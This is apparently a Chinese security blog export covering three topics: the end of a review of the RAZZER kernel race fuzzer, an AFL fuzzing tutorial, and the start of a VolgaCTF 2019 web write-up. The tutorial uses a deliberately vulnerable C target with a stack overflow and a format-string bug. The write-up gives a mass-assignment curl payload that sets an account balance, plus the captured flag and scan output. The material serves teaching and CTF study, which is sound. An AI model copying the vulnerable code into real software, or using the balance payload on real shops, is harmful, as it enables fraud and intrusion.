特别是基于这些CVE案例，表明RAZZER比Syzkaller更快，至少为23至85倍。 图10：Syzkaller和RAZZER在查找触发竞争的用户程序时的效率。 作者测量了执行总次数和找到之前已知竞争所需的时间。 RAZZER在合理的时间内找到了所有已知的竞争，而Syzkaller在10小时的给定时间内没有发现任何竞争（v4.8）。 图11显示了在运行RAZZER和SKIEmu时触发每个竞争所需的执行次数。 由于RAZZER仅探索与RacePairscand相关的线程交错（通过运行给定的用户程序发现），因此探索的线程交错情况要少得多，RAZZER所需的执行次数远少于SKIEmu，范围从30次减少到398次。 这个结果还表明，SKIEmu探索的许多线程交错案例与竞争无关，这标志着RAZZER在满足R2方面的有效性。 图11：SKIEmu和RAZZER在揭示触发竞争的线程交错方面的效率。 Found列显示了查找交错所需的执行次数（通过重复实验5次并计算平均值获得），Total列显示每个工具所需的理论最大执行次数（v4.8）。 V. 相关工作面向内核的Fuzzing测试的主要思想是通过给内核驱动输入大量畸形数据，观察操作系统对这些畸形数据处理后的反应，如果出现了蓝屏或者崩溃等信息，则再对dump信息进行静态分析定位漏洞[10]。这类工具如IOCTL、Syzkaller等。此节将主要介绍那些能够识别（或协助识别）数据竞争的技术。 动态模糊测试 最近的许多研究表明，模糊测试是一种很有前途的技术，用于发现用户程序中[11]和内核[12]的bug。 模糊测试的关键优势不仅在于该方法可以有效地发现目标程序中的bug，而且还可以避免误报，因为它会产生再现bug的输入。 然而，据我们所知，所有模糊测试技术在用于识别竞争bug时效率低下，主要是因为他们的设计不适合竞争。 虽然大多数模糊器专注于利用先前探索的执行覆盖，但他们不考虑线程交错。 与这些相比，本文介绍的RAZZER则综合考虑了执行覆盖和线程交错从而更有效地发现数据竞争。 动态线程调度程序 一些研究例如试图通过实现随机化每线程执行调度的定制线程调度器来找到引起竞争的线程交错的实例。 特别是，PCT算法[13]和SKI [4]通过探索所有可能的线程交错情况来发现用户程序或内核中的竞争。 这两种方法的局限性是：（i）他们不生成（或改变）输入程序，因此它找不到触发数据竞争的新程序; （ii）它们无法找到同时执行RacePaircand的输入程序的线程交错，因为它们必须搜索所有可能的线程交错情况的非常大的空间。 事实上，RAZZER的设计灵感来自PCT算法和SKI它通过定制模糊过程来满足R1，同时通过对RacePairscand进行优先搜索来有效地满足R2。 动态竞争检测器 许多研究[14]试图通过收集关于竞争的丰富的上下文信息来改善运行时的竞争检测能力。 这些基本上与RAZZER正交，也就是说它们与RAZZER一起部署后，RAZZER的竞争检测能力也可以得到增强。 特别是，ThreadSanitizer [15]是由谷歌开发的企业级竞争检测器，最近也应用在了Linux内核发布之前的检测。 为了在检测竞争时增强性能，TxRace [16]利用硬件事务存储器，ProRace [17]利用性能监控单元。 存储器采样技术有选择地监视存储器访问以优化性能。 RaceMob [18]从静态分析生成的潜在数据竞争中众包运行时竞争测试。 Snorlax [19]建议使用粗略交错假设来利用粗粒度定时信息来确定事件的线程交错。 静态分析 静态分析已被广泛用于发现未知的bug。在此类别中，我们将重点讨论与竞争bug检测或点对分析实施相关的静态分析工作。 Relay [20]是一个静态的竞争检测器，适用于内核等大型程序。 Relay通过执行基于锁定的自下而上分析生成RacePairscand，同时总结每个函数的行为。 RacerX [21]也可用于查找大型复杂多线程系统的竞争条件和死锁。由于单独使用静态分析技术的局限性，这些基本上导致高的误报率（例如，Relay在Linux内核上显示出84％的误报率），严重限制了它们在实践中的使用。然而，RAZZER还利用动态分析技术，解决了高误报率的可能性。在点对分析实施方面，最近提出了K-miner [22]，通过程序间和上下文敏感性分析揭示商品操作系统中的内存损坏漏洞。 RAZZER的静态分析是基于K-miner的实现而构建的，但经过修改以通过点分析来识别RacePairscand。 VI.讨论静态分析中的漏报 由于RAZZER依赖于静态分析的结果，如果RacePaircand中缺少任何真正的竞争对，则会导致RAZZER对bug的漏报。 静态分析的这种丢失情况可能主要是因为分区分析发生的。 因为RAZZER的分区分析基于跨越不同内核模块的竞争很少发生（例如，文件系统和终端设备驱动程序）这个假设。 因此，如果假设的情况发生了，RAZZER的RacePaircand将不会包含这样的竞争对，从而导致漏报。要解决这个问题，可以去除RAZZER的分区分析，采用更精确的静态分析技术。 将RAZZER应用于其他系统 RAZZER是一种灰盒模糊测试，所以只要源代码和对应的虚拟环境的支持，将RAZZER应用于其他现代操作系统（如Windows，MacOSX，FreeBSD，以及一些开源内核）是很容易的。 从介绍以及开源的代码上来看RAZZER只是在处理系统调用调用模型的时候是针对Linux的，其余所有设计都是平台无关的，因为其核心机制可以离线（即静态分析）或透明（即定制执行系统管理程序）。 变异策略 如果将RAZZER测试内核竞争漏洞的思想应用于用户程序，可能不需要在识别竞争后再使用其他变异策略。 因为与偶尔允许使用竞争提高性能的Linux内核不同，大多数用户程序中都会存在数据竞争这样的bug。 VII.结论本文基于RAZZER这种结合静态分析和动态模糊测试的方案，来对内核竞争漏洞的模糊测试技术做了介绍。RAZZER是一款为竞争漏洞量身定制的模糊测试工具，不仅其实现方案极具代表性，其实的实际效果也非常的好。 它利用静态分析来发现潜在的数据竞争点，以指导模糊器识别竞争。 此外，它修改底层管理程序以确定性地触发竞争。 对RAZZER的评估证明了其强大的检测竞争的能力。 它已经在Linux内核中发现了30个新的竞争，并且与其他最先进的工具（特别是Syzkaller和SKI）进行了比较研究，证明了它在检测内核中的竞争漏洞方面的出色表现。 REFERENCES[1] MITRE. CVE-2016-8655., 2016. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655. [2] MITRE. CVE-2017-2636., 2017. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636. [3] MITRE. CVE-2017-17712., 2017. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17712. [4] Fonseca P , Rodrigues R , Björn B. Brandenburg. SKI: exposing kernel concurrency bugs through systematic schedule exploration[C]// Usenix Conference on Operating Systems Design &amp; Implementation. USENIX Association, 2014. [5] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167. [6] I. Molnar. Runtime locking correctness validator, 2018. https://www.kernel.org/doc/Documentation/locking/lockdep-design.txt. [7] Kernel address sanitizer, 2018. https://github.com/google/kasan/wiki. [8] Sui Y , Xue J . [ACM Press the 25th International Conference - Barcelona, Spain (2016.03.17-2016.03.18)] Proceedings of the 25th International Conference on Compiler Construction - CC 2016 - SVF: interprocedural static value-flow analysis in LLVM[J]. 2016:265-266. [9] D. Vyukov. Syzkaller, 2015. https://github.com/google/syzkaller. [10] 史记, 曾昭龙, 杨从保, et al. Fuzzing 测试技术综述[J]. 信息网络安全, 2014(3):87-91. [11] Pham V T , Roychoudhury A . Coverage-based Greybox Fuzzing as Markov Chain[C]// Acm Sigsac Conference on Computer &amp; Communications Security. ACM, 2016. [12] You W , Zong P , Chen K , et al. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits[C]// Acm Sigsac Conference. ACM, 2017. [13] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167. [14] Veeraraghavan K , Chen P M , Flinn J , et al. Detecting and Surviving Data Races using Complementary Schedules[C]// Proceedings of the 23rd ACM Symposium on Operating Systems Principles 2011, SOSP 2011, Cascais, Portugal, October 23-26, 2011. ACM, 2011. [15] Serebryany K , Iskhodzhanov T . ThreadSanitizer: data race detection in practice[C]// Workshop on Binary Instrumentation &amp; Applications. ACM, 2009. [16] Zhang T , Lee D , Jung C . TxRace: Efficient Data Race Detection Using Commodity Hardware Transactional Memory[J]. Acm Sigplan Notices, 2016, 50(2):159-173. [17] Zhang T , Jung C , Lee D . ProRace: Practical Data Race Detection for Production Use[J]. Acm Sigarch Computer Architecture News, 2017, 45(1):149-162. [18] Kasikci B , Zamfir C , Candea G . RaceMob: Crowdsourced data race detection[C]// Proceedings of the Twenty-Fourth ACM Symposium on Operating Systems Principles. ACM, 2013. [19] Kasikci B , Cui W , Ge X , et al. [ACM Press the 26th Symposium - Shanghai, China (2017.10.28-2017.10.28)] Proceedings of the 26th Symposium on Operating Systems Principles, - SOSP \”17 - Lazy Diagnosis of In-Production Concurrency Bugs[J]. 2017:582-598. [20] Voung J W , Jhala R , Lerner S . RELAY: static race detection on millions of lines of code[C]// Proceedings of the 6th joint meeting of the European Software Engineering Conference and the ACM SIGSOFT International Symposium on Foundations of Software Engineering, 2007, Dubrovnik, Croatia, September 3-7, 2007. ACM, 2007. [21] Engler D . RacerX : Effective, static detection of race conditions and deadlocks[C]// Proc. ACM Symposium Operating Systems Principles, 2003. ACM, 2003. [22] D. Gens, S. Schmitt, L. Davi, and A.-R. Sadeghi. K-miner: Uncovering memory corruption in linux. In Proceedings of the 2018 Annual Network and Distributed System Security Symposium (NDSS), San Diego, CA, Feb. 2018.]]></content>
  </entry>
  <entry>
    <title><![CDATA[AFL使用指南]]></title>
    <url>%2F2019%2F05%2F15%2Fhow-to-use-afl-fuzz%2F</url>
    <content type="text"><![CDATA[0x00 前言二进制分析方面主要利用技术包括：动态分析(Dynamic Analysis)、静态分析(Static Analysis)、符号化执行(Symbolic Execution)、Constraint Solving、资讯流追踪技术(Data Flow Tracking)以及自动化测试(Fuzz Testing) AFL原理介绍参考：《AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing》 本指南使用的环境是 kali linux 2019.1 0x01 AFL的基本使用1. 使用afl-gcc1.1 使用AFL插桩程序目标程序 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln(char *str)&#123; int len = strlen(str); if(str[0] == 'A' &amp;&amp; len == 66) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 &#125; else if(str[0] == 'F' &amp;&amp; len == 6) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 &#125; else &#123; printf("it is good!\n"); &#125; return 0;&#125;int main(int argc, char *argv[])&#123; char buf[100]=&#123;0&#125;; gets(buf);//存在栈溢出漏洞 printf(buf);//存在格式化字符串漏洞 vuln(buf); return 0;&#125; 使用afl-gcc进行插桩编译 1afl-gcc -g -o ./zerotest/vuln ./zerotest/vuln.c PS:如果目标程序中有Makefile，那么分两种情况: 程序是用autoconf构建，那么此时只需要执行如下即可 1./configure CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot; 此外，还可以执行如下语句设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，进行静态构建而不是动态链接 1./configure --disable-shared CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot; 程序不是用autoconf构建，那么直接修改Makefile文件中的编译器为afl-gcc/g++。 为了后期更好的分析crash，在此处可以开启Address Sanitizer(ASAN)这个内存检测工具，此工具可以更好的检测出缓存区溢出、UAF 等内存漏洞，开启方法如下: 12AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-sharedAFL_USE_ASAN=1 make 不使用 AFL 编译插桩时，可使用以下方式开启 Address Sanitizer。 12./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;make 1.2 开始fuzzfuzz的语法一般情况是两种: 直接从stdin读取输入的目标程序 1$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…] 从文件读取输入的目标程序，@@就是占位符，表示输入替换的位置 1$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@ 此处我采用第一种方式 1afl-fuzz -m 300 -i ./zerotest/fuzz_in -o ./zerotest/fuzz_out ./zerotest/vuln -f PS: 常见参数的含义如下 -f参数表示：testcase的内容会作为afl_test的stdin -m参数表示分配的内存空间 -i 指定测试样本的路径 -o 指定输出结果的路径 /dev/null 使错误信息不输出到屏幕 -t：设置程序运行超时值，单位为 ms -M：运行主(Master) Fuzzer -S：运行从属(Slave) Fuzzer 1.3 fuzz的结果 从界面上主要注意以下几点: last new path 如果报错那么要及时修正命令行参数，不然继续fuzz也是徒劳（因为路径是不会改变的）； cycles done 如果变绿就说明后面及时继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止 uniq crashes 代表的是crash的数量 1.4 crash分析PS: xxd命令的作用就是将一个文件以十六进制的形式显示出来 可以看到已经得到的几个crash文件，那么分析的话只需要将其作为之前vuln文件的输入，使用gdb调试分析就可以得到详细结果了，但是在这之前可以使用xxd看一下其中数据的内容做一个初步的判断。 分别看一下这几个crash的信息 可以看到应该是满足了开头是F且字符串长度为6的异常退出情况 看这个数据情况可能是栈溢出 栈溢出 符合首字符为A且栈溢出 格式化字符串?可能 符合首字符为A且字符串长度为66的异常退出情况 主要参考:《初探Fuzz-AFL》 1.5 语料库蒸馏(Corpus Distillation)一般来说在进行fuzz之前构建一份有效的语料库是十分有必要的，这将作为程序开始时的种子。 语料库的信息来源主要如下: 使用项目自身提供的测试用例 目标程序bug提交页面 使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式： afl源码的testcases目录下提供了一些测试用例 其他开源的语料库 收集完后可以使用afl提供的工具来对语料库进行进一步的处理: afl-cmin: 移除执行相同代码的输入文件afl-cmin的核心思想是: 尝试找到与语料库全集具有相同覆盖范围的最小子集。它一般的两种执行模式是: 1afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] 1afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@ afl-tmin: 减小单个输入文件的大小它有两种工作模式: instrumented mode和crash mode。默认的工作方式是instrumented mode 12# instrumented modeafl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@ 12# crash mode 将会剔除导致crash的文件afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@ 由于只能针对单个目标进行使用，因此使用如下shell脚本进行批量处理 1for i in *; do afl-tmin -i $i -o tmin-$i -- ~/path/to/tested/program [params] @@; done; 或者修改如下的Python脚本进行预处理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import osimport sysimport shutildef cmin(): command = ' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null' os.system('afl-cmin -i seeds/tmin -o seeds/cmin ' + command)def tmin(): command = ' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null' seed_list = os.listdir('seeds/all_format') for seed in seed_list: in_file = os.path.join('seeds/all_format', seed) out_file = os.path.join('seeds/tmin', seed) if os.path.getsize(in_file) &gt; 1024*1: if os.path.getsize(in_file) &lt; 1024*3 and not seed.endswith('.txt'): os.system('afl-tmin -i ' + in_file + ' -o ' + out_file + command) print('afl-tmin -i ' + in_file + ' -o ' + out_file + command) else: pass elif os.path.getsize(in_file) &gt; 0: shutil.copyfile(in_file,out_file) else: passdef convert(origin_seeds): seed_list = os.listdir(origin_seeds) for seed in seed_list: seed_in = os.path.join(origin_seeds, seed) file_name = (os.path.splitext(seed)[0]) coder_list = os.listdir('coders') for cfile in coder_list: if cfile.endswith('.c'): extern = cfile[:cfile.find('.c')] seed_out = 'seeds/all_format/' + file_name + '.' + extern os.system('utilities/magick convert ' + seed_in + ' ' + seed_out)if __name__ == '__main__': if len(sys.argv) &lt; 2: print 'Usage: ' + sys.argv[0] + ' origin_seeds_dir' else: origin_seeds_dir = sys.argv[1] try: os.mkdir('seeds') seeds_path = os.path.join(os.path.abspath('.'),'seeds') os.mkdir(os.path.join(seeds_path,'all_format')) os.mkdir(os.path.join(seeds_path,'cmin')) os.mkdir(os.path.join(seeds_path,'tmin')) except: print 'make dir fail!' convert(origin_seeds_dir) tmin() cmin() 预处理脚本来自:《使用 AFL 进行模糊测试》 2. LLVM Mode模式2.1 启用llvmLLVM Mode模式编译程序可以获得更快的Fuzzing速度，因此针对大型项目可以考虑启用。 下载必要的安装包 1234wget http://releases.llvm.org/8.0.0/llvm-8.0.0.src.tar.xzwget http://releases.llvm.org/8.0.0/compiler-rt-8.0.0.src.tar.xzwget http://releases.llvm.org/8.0.0/clang-tools-extra-8.0.0.src.tar.xzwget http://releases.llvm.org/8.0.0/cfe-8.0.0.src.tar.xz 解压缩 12345xz -d ./*tar xvf cfe-8.0.0.src.tartar xvf clang-tools-extra-8.0.0.src.tartar xvf llvm-8.0.0.src.tartar xvf compiler-rt-8.0.0.src.tar 源码合并 123456mv cfe-8.0.0.src clangmv clang llvm-8.0.0.src/toolsmv clang-tools-extra-8.0.0.src extramv extra llvm-8.0.0.src/tools/clangmv compiler-rt-8.0.0.src compiler-rtmv compiler-rt llvm-8.0.0.src/projects 编译安装 12345mkdir build-8.0cmake ../llvm-8.0.0.src/cmake --build .cmake --build . --target installcmake -DCMAKE_INSTALL_PREFIX=/tmp/llvm -P cmake_install.cmake 上面的编译安装对硬件配置和硬盘的空间要求比较高，所以你可以直接使用源进行安装，比如： 1apt install llvm clang 编译安装afl的llvm模块(我的使用的是kali linux 2019.1进行编译的，clang版本过高会失败，使用clang++也会失败，所以最终发现下面方法可行) 1234cd afl/llvm_modeexport CXX=/usr/bin/g++export CC=/usr/bin/clang-6.0make 因为clang没有办法使用update-alternatives，因此我直接修改软连接 12ln -s /usr/bin/clang-6.0 /usr/bin/clangln -sb /usr/bin/clang++-6.0 /usr/bin/clang++ 之后就可以正常使用afl-clang-fast了 其实以上均太费劲，还有更简单的方法，kali linux的源中包含了afl，所以可以直接apt进行安装，装好之后afl-clang-fast也就有了 1apt install afl 2.2 使用LLVM Mode模式进行fuzz编译插桩 1root@kali-z ~/Desktop/fuzz/afl$ ./afl-clang-fast -g -o ./zerotest/vuln-fast ./zerotest/vuln.c 之后重复上面的方式进行fuzz即可，接下来展示一个使用此模式fuzz php内核代码的例子。 1. 下载目标代码1wget https://github.com/php/php-src/archive/php-7.2.11.tar.gz &amp;&amp; tar xf php-7.2.11.tar.gz 2. 进行编译插桩1234cd php-src-php-7.2.11./buildconf --forceCC=afl-clang-fast CXX=afl-clang-fast++ ./configureAFL_USE_ASAN=1 make PS: 如果报错缺失libconv，则在Makefile中的EXTRA_LIBS =添加-liconv 3. 进行源代码的修改未修改之前 sapi/cli/php_cli.c修改之后 sapi/cli/php_cli.c修改完之后执行如下进行rebuild 1AFL_USE_ASAN=1 make PS: 之所以进行这样的修改，是因为我们使用php -r来eval php string，因此定位到sapi/cli/php_cli.c进行代码的修改离开提升后期fuzz的效率。 4. 构造一个输入点我们想在fuzz的时候从stdin进行数据的输入，因此构造如下输入点 1unserialize(file_get_contents(“php://stdin”)); 5. 根据上述的构造点构造输入数据此处账户要考虑构造不同类类型的输入数据，构造如下 1234567mkdir serialized_data &amp;&amp; cd serialized_data../sapi/cli/php -r &apos;echo serialize(&quot;a&quot;);&apos; &gt; string../sapi/cli/php -r &apos;echo serialize(1);&apos; &gt; number../sapi/cli/php -r &apos;echo serialize([1,2]);&apos; &gt; array_of_num../sapi/cli/php -r &apos;echo serialize([&quot;1&quot;,&quot;2&quot;]);&apos; &gt; array_of_str../sapi/cli/php -r &apos;echo serialize([[&quot;1&quot;,&quot;2&quot;],[&quot;3&quot;,&quot;4&quot;],[1,2]]);&apos; &gt; array_of_arrayecho &apos;O:6:&quot;zeroyu&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;npusec2&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&apos; &gt; class 6. 开始fuzz为了从地址清理(ASAN)中获得有用的结果，有必要设置一个环境变量，以便PHP禁用其自定义内存分配器，从而使内存安全问题对ASAN可见。 1USE_ZEND_ALLOC=0 screen -S zeroyu 使用screen可以随时进入查看fuzz的结果 1screen -r zeroyu 使用如下命令开始fuzz 12cd..afl-fuzz -i serialized_data -o basic_fuzz -m none -- ./sapi/cli/php -r &apos;unserialize(file_get_contents(&quot;php://stdin&quot;));&apos; 7. 分析crash用是使用如下bash脚本来寻找可能是bug的crash，因为有些是良性的crash，是由于ASAN无法分配足够的内存。这是因为ASAN需要额外的内存来跟踪所有分配，而精心编制的序列化对象可能会触发大内存分配。 1for FILE in $(ls id*); do cat $FILE | ../../sapi/cli/php -r "unserialize(file_get_contents('php://stdin'));" 2&gt;&amp;1 | grep -E "SUMMARY|ERROR" | grep -v "LargeMmap" &amp;&amp; echo $FILE; done 参考: 《Fuzzing PHP for Fun and Profit》 3. 黑盒测试参考：《AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing》 4. 并行测试4.1 单系统并行查看系统核心数 1cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq afl-fuzz并行Fuzzing，一般的做法是通过-M参数指定一个主Fuzzer(Master Fuzzer)、通过-S参数指定多个从Fuzzer(Slave Fuzzer)。 123$ screen afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./program$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./program$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program PS: -o指定的是一个同步目录，并行测试中，所有的Fuzzer将相互协作，在找到新的代码路径时，相互传递新的测试用例。所以不用担心重复的问题 两个辅助工具: afl-whatsup工具可以查看每个fuzzer的运行状态和总体运行概况，加上-s选项只显示概况，其中的数据都是所有fuzzer的总和。 afl-gotcpu工具可以查看每个核心使用状态。 4.2 多系统并行压缩每个fuzzer实例目录中queue下的文件，通过如下SSH脚本同步分发到其他机器上解压。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/bin/sh# authorized_keys的方式进行ssh认证# 所有要同步的主机FUZZ_HOSTS='172.21.5.101 172.21.5.102'# SSH userFUZZ_USER=root# 同步目录SYNC_DIR='/root/syncdir'# 同步间隔时间SYNC_INTERVAL=$((30 * 60))if [ "$AFL_ALLOW_TMP" = "" ]; then if [ "$PWD" = "/tmp" -o "$PWD" = "/var/tmp" ]; then echo "[-] Error: do not use shared /tmp or /var/tmp directories with this script." 1&gt;&amp;2 exit 1 fifirm -rf .sync_tmp 2&gt;/dev/nullmkdir .sync_tmp || exit 1while :; do # 打包所有机器上的数据 for host in $FUZZ_HOSTS; do echo "[*] Retrieving data from $&#123;host&#125;..." ssh -o 'passwordauthentication no' $&#123;FUZZ_USER&#125;@$&#123;host&#125; \ "cd '$SYNC_DIR' &amp;&amp; tar -czf - SESSION*" &gt;".sync_tmp/$&#123;host&#125;.tgz" done # 分发数据 for dst_host in $FUZZ_HOSTS; do echo "[*] Distributing data to $&#123;dst_host&#125;..." for src_host in $FUZZ_HOSTS; do test "$src_host" = "$dst_host" &amp;&amp; continue echo " Sending fuzzer data from $&#123;src_host&#125;..." ssh -o 'passwordauthentication no' $&#123;FUZZ_USER&#125;@$dst_host \ "cd '$SYNC_DIR' &amp;&amp; tar -xkzf - &amp;&gt;/dev/null" &lt;".sync_tmp/$&#123;src_host&#125;.tgz" done done echo "[+] Done. Sleeping for $SYNC_INTERVAL seconds (Ctrl-C to quit)." sleep $SYNC_INTERVAL done 0x02 Fuzz结果分析和代码覆盖率1. 工作状态afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示: 状态窗口的cycles done变为绿色; afl-whatsup查看afl-fuzz状态; afl-stat得到类似于afl-whatsup的输出结果; 定制afl-whatsup-&gt;在所有代码外面加个循环就好; 用afl-plot绘制各种状态指标的直观变化趋势; pythia估算发现新crash和path概率。 2. fuzz结束判断 状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考; 距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握; 目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见; pythia提供的各种数据中，path covera达到99或者correctness的值达到1e-08(含义: 从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行) 3. 输出结果说明 queue：存放所有具有独特执行路径的测试用例。 crashes：导致目标接收致命signal而崩溃的独特测试用例。 crashes/README.txt：保存了目标执行这些crash文件的命令行参数。 hangs：导致目标超时的独特测试用例。 fuzzer_stats：afl-fuzz的运行状态。 plot_data：用于afl-plot绘图。 4. 对crash结果的简单分析和分类 crash exploration modeafl-fuzz的一种运行模式，也称为peruvian rabbit mode，用于确定bug的可利用性，其输入的是crash的信息，之后使用-C启用这种模式，afl会自动探索并创造与之相关的crash来帮助你进行分析，比如判断能够控制某块内存地址的长度。 1afl-fuzz -m none -C -i ./fuzz_out/crashes -o ./peruvian-were-rabbit_out -- ./vuln -f triage_crashes.shAFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。 直接使用脚本跟参数的话，我们可以看到相关crash情况的寄存器等信息，但是如果只是大致分类的话，可以使用如下命令 1/root/Desktop/fuzz/afl/experimental/crash_triage/triage_crashes.sh ./fuzz_out ./vuln 2&gt;&amp;1 | grep SIGNAL 效果如下，11代表了SIGSEGV信号，有可能是因为缓冲区溢出导致进程引用了无效的内存 crashwalk优点:可以显示更为详细的信息项目地址: https://github.com/bnagy/crashwalk 1234# 手动模式~/go/bin/cwtriage -root ./fuzz_out/crashes -match id -- ./vuln -f# afl自动化模式~/go/bin/cwtriage -root ./fuzz_out/crashes -afl afl-collect 项目地址: https://github.com/rc0r/afl-utilsafl-collect基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。 1afl-collect -j 8 -d crashes.db -e gdb_script ./fuzz_out ./fuzz_in -- ./vuln --target-opts 效果如下 5. 代码覆盖率原理部分参考:《AFL漏洞挖掘技术漫谈（二）：Fuzz结果分析和代码覆盖率》 afl-cov的使用说明如下:首先使用gcov重新编译源码 1gcc -fprofile-arcs -ftest-coverage vuln.c -o vuln_cov 如果遇到需要make进行编译的文件，执行如下: 1234$ make clean$ ./configure --prefix=/root/tiff-4.0.10/build-cov CC=&quot;gcc&quot; CXX=&quot;g++&quot; CFLAGS=&quot;-fprofile-arcs -ftest-coverage&quot; --disable-shared$ make$ make install 之后使用afl-cov来计算覆盖率 1afl-cov -d ./fuzz_out --live --enable-branch-coverage -c . -e &quot;cat AFL_FILE | ./vuln_cov AFL_FILE&quot; 同时进行对插桩过的vuln的fuzz 1afl-fuzz -i ./fuzz_in -o ./fuzz_out ./vuln -f 最终效果如下 生成的报告会保存在/path/to/afl-fuzz-output/cov/web/lcov-web-final路径下。]]></content>
  </entry>
  <entry>
    <title><![CDATA[VolgaCTF 2019 Qualifier Web]]></title>
    <url>%2F2019%2F04%2F03%2FVolgaCTF-2019-Qualifier-Web%2F</url>
    <content type="text"><![CDATA[0x00 前言比赛地址: https://q.2019.volgactf.ru/tasks 时间: 星期五, 三月 29, 11:00 PM (23:00) — 星期日, 三月 31, 11:00 PM (23:00) 0x01 shop 信息泄露 robots.txt-&gt;shop.1.0.0.war 此处我直接使用idea自动对代码进行反编译，来对代码进行审计 漏洞主要存在于buy的路由处，在此处使用了spring mvc的@ModelAttribute。它的作用是从modle中获取一个对象，然后使用用户的请求request来赋值，这就造成我们可以对其中的某些变量进行控制。漏洞类型属于自动绑定漏洞。 从user类中我们看到可以控制balance。(PS:自动绑定漏洞是调用set和get方法的并不是直接操控变量或者数据库值) 1234567public Integer getBalance() &#123; return this.balance;&#125;public void setBalance(Integer weight) &#123; this.balance = weight;&#125; 而从程序的校验来看如果可以控制balance那么就可以满足校验，从而成功购买flag 123456789101112131415161718192021222324@RequestMapping(&#123;"/buy"&#125;)public String buy(@RequestParam Integer productId, @ModelAttribute("user") User user, RedirectAttributes redir, HttpServletRequest request) &#123; HttpSession session = request.getSession(); if (session.getAttribute("user_id") == null) &#123; return "redirect:index"; &#125; else &#123; Product product = this.productDao.geProduct(productId); if (product != null) &#123; if (product.getPrice() &lt;= user.getBalance()) &#123; user.setBalance(user.getBalance() - product.getPrice()); user.getCartItems().add(product); this.userDao.update(user); redir.addFlashAttribute("message", "Successful purchase"); return "redirect:profile"; &#125; redir.addFlashAttribute("message", "Not enough money"); &#125; else &#123; redir.addFlashAttribute("message", "Product not found"); &#125; return "redirect:index"; &#125;&#125; payload 1curl -i http://shop.q.2019.volgactf.ru/buy --cookie &quot;JSESSIONID=9C636630989A68978E11C28CCAABA31F&quot; --data &quot;productId=4&amp;balance=100000&quot; -L flag 1VolgaCTF&#123;c6bc0c68f0d0dac189aa9031f8607dba&#125; 0x02 HeadHunter0x03 Gallery 进行信息收集 使用dirsearch收集到如下信息 12345678910111213141516171819202122232425262728293031[22:14:44] 301 - 194B - /js -&gt; http://142.93.204.169/js/[22:18:24] 403 - 0B - /api/error_log[22:18:24] 403 - 0B - /api/[22:18:24] 200 - 35B - /api[22:18:24] 200 - 35B - /apibuild.pyc[22:19:20] 301 - 194B - /css -&gt; http://142.93.204.169/css/[22:20:09] 301 - 194B - /js -&gt; http://142.93.204.169/js/[22:20:18] 200 - 3KB - /login[22:20:18] 200 - 3KB - /login.cgi[22:20:18] 200 - 3KB - /login.html[22:20:18] 200 - 3KB - /login.jsp[22:20:18] 200 - 3KB - /login.js[22:20:18] 200 - 3KB - /login.php[22:20:18] 200 - 3KB - /login.pl[22:20:19] 200 - 3KB - /login.rb[22:20:19] 200 - 3KB - /login.shtml[22:20:19] 200 - 3KB - /login.py[22:20:19] 200 - 3KB - /login.srf[22:20:19] 200 - 3KB - /login/[22:20:19] 200 - 3KB - /login/admin/[22:20:19] 200 - 3KB - /login/cpanel/[22:20:19] 200 - 3KB - /login/cpanel.js[22:20:19] 200 - 3KB - /login.htm[22:20:19] 200 - 3KB - /login/oauth/[22:20:19] 200 - 3KB - /login_admin.js[22:20:19] 200 - 3KB - /login_admin[22:20:19] 200 - 3KB - /logins.txt[22:20:20] 200 - 3KB - /login/administrator/[22:20:43] 200 - 459B - /package.json[22:21:18] 301 - 194B - /sessions -&gt; http://142.93.204.169/sessions/[22:21:18] 200 - 169B - /sessions/ 查看/js/可以列出当前站点的文件 